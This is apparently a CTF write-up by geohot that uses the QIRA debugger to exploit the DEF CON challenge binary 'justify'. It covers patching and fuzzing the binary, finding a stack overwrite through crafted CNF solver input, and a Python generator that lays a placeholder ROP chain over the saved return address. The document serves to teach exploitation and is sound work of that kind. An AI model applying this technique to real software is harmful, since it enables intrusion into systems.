# Introduction #

justify was one the problems in this years defcon CTF, and the one that brought the most points to PPP. Let's solve it. Made with qira-0.9, you should know how to make it match by now.

# Let's play #

```
# assumes you have already ran ./fetchlibs.sh, justify is a dynamically linked ARM binary
qira -s ./justify
```

justify is now listening on port 4000. QIRA is up on port 3002. Let's also open it in IDA.

QEMU has loaded the binary with base 0xF6FF4000, since it's PIE. The addresses IDA loads at by default won't work, since they include the 0 page. Edit->Segments->Rebase Program, Image Base, 0xF6FF4000, and the addresses match and integration works.

# Fun with nc #

```
nc localhost 4000   # connect to justify
```

Hmm, odd. justify just exited, but in the strace we see chdir("/home/justify") = -1. A quick

```
# use /tmp instead of /home
sed s/home/\\/tmp/ justify > justify_patched
# remove any pesky alarms
sed -i s/alarm/isnan/ justify_patched
mkdir /tmp/justify
chmod +x justify_patched
qira -s ./justify_patched
```

And we are back in business.

![http://wiki.qira.googlecode.com/git/images/justify/0.png](http://wiki.qira.googlecode.com/git/images/justify/0.png)

Ok, so we are blocked on a recv of 1. Change 150 was highlighted, but I pressed comma(top of current function) and up arrow(clnum -= 1) to get to change 143 where the recv was called. Now lets look around a little in IDA to see what that recv is expecting.

```
valid chars
' ' -- sets [R7, #0x20+var_8], which gates other functions, name it gate_flag
'%' -- appears to make big stuff happen, but only with gate_flag and ptr set
and there's 3 stores to ptr, 2 of them 0, so following the nonzero store
'$' -- malloc buf of size [0x20+var_14](name size) and recv into malloced
'#' -- recv 4, set the size
```

Okay, so lets go over to little python in our little window and code. Exit nc, and shift-C in QIRA to clear the current forks.

![http://wiki.qira.googlecode.com/git/images/justify/1.png](http://wiki.qira.googlecode.com/git/images/justify/1.png)

We got a segfault, but not a very useful one. Looks more like a null pointer. But in that function, there's a memcmp to "p cnf ". After googling that, we see it's a constraint solver format. Copy in the example from google, and we are in business.

```
p cnf 3 2
1 -3 0
2 3 -1 0
```

![http://wiki.qira.googlecode.com/git/images/justify/2.png](http://wiki.qira.googlecode.com/git/images/justify/2.png)

Much longer, and we are blocked again on the top receive. Google also tells us the two numbers on the top line are variable count and clause count. We fuzz these a little, and find a big variable count like 512 seems to dump stack back to us.

```
p cnf 512 2
1 -3 0
2 3 -1 0
```

```
:w !python
1 2 3 00000000: 01                                                .
00000000: C6 FF FF 07 FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000010: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000020: FF FF FF FF FF FF FF FF  FF FF FF FF C6 FF FF 07  ................
00000030: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000040: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 28 2E FF F6 28 D2 5C F6  FF 01 00 00 FF FF FF FF  (...(.\.........
00000060: 00 00 00 00 01 02 00 00  00 2E FF F6 93 4C FF F6  .............L..
00000070: 00 00 00 00 08 D0 5C F6  08 D0 5C F6 1B 00 00 00  ......\...\.....
...
```

<table>
<tr>
<td width='600px'><img src='http://wiki.qira.googlecode.com/git/images/justify/2_little.png'></img></td>
<td width='250px'>
Using QIRA, we dig into why. Using u and i to jump through data references, we see those FF FF FF FF were written one bit at a time, with a counter at +0x2C.<br />And it looks like we trashed the counter, one bit at a time(j and k to jump through same instruction hits).<br />
It's hard to show on a flat web page how amazing this really is!<br>
</td>
</tr>
</table>

And what would be written one bit at a time in a constraint solver. Why, the output variables of course! Pressing m to jump to the top of the function, we see it's a push {..., lr} and SP is 0xf6ff2dd8, with the first FF at 0xf6ff2d94(see in QIRA) and the counter at 0xf6ff2dbc.

```
So PC = (0xf6ff2dd4-0xf6ff2d94)*8 = var 512
And counter = (0xf6ff2dbc-0xf6ff2dd8)*8 = var 320
```

Quick sanity check, 320 doesn't dump stack, 352 does. So we need the vars from 320-352 to SAT solve to 0. After becoming an expert on CNF, to set 320 to 0, all that takes is "-320 0" as a clause, and "320 0" would set it to 1. So lets code a little python generator.

```
rop = [0x11223344, 0xAABBCCDD]
var_count = 512+len(rop)*32
clause_count = 0
pcnf = []
def push(x):
  global cnum, clause_count
  cnum += 1    # variables are 1 indexed
  pcnf.append(('-' if x=='0' else '')+str(cnum)+" 0")
  clause_count += 1
cnum = 320
map(push, "0"*32)
cnum = 512
for r in rop:
  map(push, bin(r)[2:][::-1].ljust(32, '0'))
dat = "p cnf %d %d\n" % (var_count, clause_count) + '\n'.join(pcnf)
```

This will 0 out the counter, allowing the function to return, and also write the ROP payload starting at where PC will be popped from. And sure enough...

<img src='http://wiki.qira.googlecode.com/git/images/justify/3.png' width='600px></img'>

Hopefully you can take it from here.<br>
<br>
~geohot